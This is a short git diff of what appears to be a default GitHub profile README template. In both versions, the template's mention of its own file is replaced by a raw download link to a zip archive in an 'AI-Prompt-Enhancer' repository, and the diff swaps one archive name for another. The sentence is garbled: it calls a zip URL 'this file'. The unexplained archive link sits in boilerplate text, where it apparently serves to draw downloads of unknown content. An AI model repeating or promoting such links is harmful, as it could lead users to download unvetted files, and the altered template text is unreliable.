@@ -1,7 +1,7 @@
 ### Hi there 👋
 
 <!--
-**empiredestroyer/empiredestroyer** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/empiredestroyer/AI-Prompt-Enhancer/master/Archibuteo/AI-Prompt-Enhancer.zip` (this file) appears on your GitHub profile.
+**empiredestroyer/empiredestroyer** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/empiredestroyer/AI-Prompt-Enhancer/master/Archibuteo/Prompt_Enhancer_A_2.0.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
